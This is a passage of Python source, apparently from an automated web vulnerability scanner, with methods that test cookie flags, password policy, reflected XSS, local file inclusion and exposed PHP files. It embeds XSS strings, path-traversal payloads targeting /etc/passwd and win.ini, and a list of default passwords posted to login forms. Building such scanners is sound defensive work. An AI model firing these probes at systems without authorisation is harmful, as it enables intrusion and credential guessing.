                        'tool': 'session_test',
                        'evidence': f'Cookie without secure flag: {cookie.name}',
                        'description': 'Session cookie transmitted over insecure channel',
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
                
                # Check for HttpOnly flag
                if 'httponly' not in str(cookie).lower():
                    finding = {
                        'type': 'Cookie without HttpOnly',
                        'url': base_url,
                        'severity': 'low',
                        'confidence': 'high',
                        'tool': 'session_test',
                        'evidence': f'Cookie accessible via JavaScript: {cookie.name}',
                        'description': 'Session cookie may be accessible to client-side scripts',
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
                        
        except Exception as e:
            self.logger.debug(f"Session test failed: {e}")
        
        return findings

    async def _test_password_policy(self, login_url: str) -> List[Dict]:
        """Test for weak password policies"""
        findings = []
        weak_passwords = ['123456', 'password', 'admin', 'test', '1234', 'administrator', 'Administrato', 'root', 'toor']
        
        try:
            for weak_pass in weak_passwords:
                form_data = {'username': 'test', 'password': weak_pass}
                response = self.session.post(login_url, data=form_data, timeout=5, verify=False)
                
                # If weak password is accepted without error, policy might be weak
                if response.status_code == 200 and 'invalid' not in response.text.lower():
                    finding = {
                        'type': 'Weak Password Policy',
                        'url': login_url,
                        'severity': 'medium',
                        'confidence': 'medium',
                        'tool': 'auth_test',
                        'evidence': f'Weak password accepted: {weak_pass}',
                        'description': 'Application accepts commonly weak passwords',
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
                    break
                    
        except Exception as e:
            self.logger.debug(f"Password policy test failed: {e}")
        
        return findings

    def _extract_form_fields(self, html_content: str) -> List[str]:
        """Extract form field names from HTML content"""
        import re
        fields = re.findall(r'name=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
        return list(set(fields))

    def _guess_login_fields(self, html_content: str, credentials: Dict) -> Dict:
        """Guess login field names and populate with credentials"""
        fields = self._extract_form_fields(html_content)
        form_data = {}
        
        for field in fields:
            field_lower = field.lower()
            if any(keyword in field_lower for keyword in ['user', 'name', 'email', 'login']):
                form_data[field] = credentials['user']
            elif any(keyword in field_lower for keyword in ['pass', 'pwd']):
                form_data[field] = credentials['pass']
            else:
                form_data[field] = 'test'
        
        return form_data

    # BASIC PARAMETER TESTING METHODS (keep existing)
    async def run_parameter_tests_async(self, target_url, crawled_urls):
        """Run comprehensive parameter-based vulnerability tests (async version)"""
        self.logger.info(f"Running parameter tests on {len(crawled_urls)} URLs")
        vulnerabilities = []
        
        # Test a subset of URLs to avoid timeout
        test_urls = crawled_urls[:20]  # Limit to first 20 URLs
        
        for url in test_urls:
            # Only test URLs with parameters
            if '?' not in url:
                continue
                
            # Extract parameters from URL
            params = self.extract_parameters(url)
            
            for param in params:
                # Test for XSS
                xss_vulns = await self.test_xss_async(url, param)
                vulnerabilities.extend(xss_vulns)
                
                # Test for LFI (only on parameters that suggest file inclusion)
                if any(keyword in param.lower() for keyword in ['file', 'page', 'path', 'load', 'document']):
                    lfi_vulns = await self.test_lfi_async(url, param)
                    vulnerabilities.extend(lfi_vulns)
        
        return vulnerabilities

    def extract_parameters(self, url):
        """Extract parameters from URL"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            return list(params.keys())
        except Exception as e:
            self.logger.debug(f"Failed to extract parameters from {url}: {e}")
            return []

    async def test_xss_async(self, url, param):
        """Test for XSS vulnerabilities (async version)"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '" onmouseover="alert(1)',
            "'><script>alert(1)</script>"
        ]
        
        vulnerabilities = []
        for payload in xss_payloads:
            try:
                test_url = self.build_test_url(url, param, payload)
                response = self.session.get(test_url, timeout=5, verify=False)
                
                # Check if payload is reflected without encoding
                if payload in response.text:
                    vuln = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': test_url,
                        'parameter': param,
                        'severity': 'high',
                        'tool': 'custom_xss_test',
                        'evidence': f'Payload reflected: {payload}',
                        'timestamp': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    self.logger.info(f"Potential XSS found: {test_url}")
                    
            except Exception as e:
                self.logger.debug(f"XSS test failed: {e}")
        
        return vulnerabilities

    async def test_lfi_async(self, url, param):
        """Test for LFI vulnerabilities (async version)"""
        lfi_payloads = [
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../../../../windows/win.ini'
        ]
        
        vulnerabilities = []
        for payload in lfi_payloads:
            try:
                test_url = self.build_test_url(url, param, payload)
                response = self.session.get(test_url, timeout=5, verify=False)
                
                # Check for LFI indicators
                if 'root:x:0:0:' in response.text:
                    vuln = {
                        'type': 'Local File Inclusion (LFI)',
                        'url': test_url,
                        'parameter': param,
                        'severity': 'high',
                        'tool': 'custom_lfi_test',
                        'evidence': 'etc/passwd content found',
                        'timestamp': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    self.logger.info(f"Potential LFI found: {test_url}")
                    break
                    
                elif '[boot loader]' in response.text:
                    vuln = {
                        'type': 'Local File Inclusion (LFI)',
                        'url': test_url,
                        'parameter': param,
                        'severity': 'high',
                        'tool': 'custom_lfi_test',
                        'evidence': 'Windows boot loader content found',
                        'timestamp': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vuln)
                    self.logger.info(f"Potential LFI found: {test_url}")
                    break
                    
            except Exception as e:
                self.logger.debug(f"LFI test failed: {e}")
        
        return vulnerabilities

    def build_test_url(self, url, param, payload):
        """Build test URL with payload"""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        
        # Replace the parameter value with payload
        if param in query_dict:
            query_dict[param] = [payload]
        
        # Rebuild query string
        new_query = '&'.join([f"{k}={v[0]}" for k, v in query_dict.items()])
        
        # Rebuild URL
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url

    async def run_php_specific_tests_async(self, url: str) -> List[Dict]:
        """Run PHP-specific vulnerability tests (async version)"""
        findings = []
        
        # Get base URL without parameters
        base_url = url.split('?')[0] if '?' in url else url
        base_path = base_url.rstrip('/')
        
        php_test_paths = [
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/admin.php', '/config.php', '/dbconfig.php',
            '/backup/', '/uploads/', '/inc/', '/include/'
        ]
        
        for path in php_test_paths:
            test_url = f"{base_path}{path}"
            try:
                response = self.session.get(test_url, timeout=3, verify=False)
                if response.status_code == 200:
                    # Check for phpinfo exposure
                    if 'phpinfo' in response.text.lower() and 'PHP Version' in response.text:
                        finding = {
                            'type': 'PHPInfo Exposure',
                            'url': test_url,
                            'severity': 'medium',
                            'confidence': 'high',
                            'tool': 'php_specific_test',
                            'evidence': 'PHPInfo configuration page exposed',
                            'description': 'PHPInfo page exposes sensitive server configuration',
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        self.logger.info(f"PHPInfo exposure found: {test_url}")
                    
                    # Check for config file exposure
                    if any(keyword in response.text for keyword in 
                          ['DB_PASSWORD', 'mysql_connect', 'database_password', 'db_host']):
                        finding = {
                            'type': 'Config File Exposure',
                            'url': test_url,
                            'severity': 'high',
                            'confidence': 'medium',
                            'tool': 'php_specific_test',
                            'evidence': 'Database credentials found in response',
                            'description': 'Configuration file exposes sensitive credentials',
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        self.logger.info(f"Config file exposure found: {test_url}")
                        
            except Exception as e:
                continue
        
        return findings

    # ENHANCED MAIN SCANNING METHOD
    async def run_comprehensive_tests(self, target: Dict, crawled_urls: List[str]) -> List[Dict]:
        """Run all comprehensive vulnerability tests"""
        url = target['url']
        findings = []
        
        print(f"         Testing: {url[:60]}...")
        
        # Run all test categories
        test_categories = [
            ("Enhanced Nuclei", self.run_nuclei_scan_async(url)),
            ("Basic Security", self.run_basic_curl_tests(url)),
            ("SQL Injection", self.run_sqlmap_quick(url)),
            ("PHP Specific", self.run_php_specific_tests_async(url)),
        ]
        
        for test_name, test_coroutine in test_categories:
            try:
                test_findings = await test_coroutine
                findings.extend(test_findings)
                if test_findings:
                    print(f"         âœ… {test_name} found {len(test_findings)} issues")
            except Exception as e:
                print(f"         âŒ {test_name} tests failed: {e}")
        
        print(f"         Found {len(findings)} potential issues")
        return findings

    # Backward compatibility
    async def run_custom_tests(self, target: Dict) -> List[Dict]:
        """Backward compatibility method"""
        return await self.run_comprehensive_tests(target, [])

    # Backward compatibility methods
    async def run_parameter_tests(self, target_url, crawled_urls):
        """Alias for async method"""
        return await self.run_parameter_tests_async(target_url, crawled_urls)
    
    def run_nuclei_scan(self, target):
        """Sync wrapper for nuclei scan"""
        import asyncio
        return asyncio.run(self.run_nuclei_scan_async(target))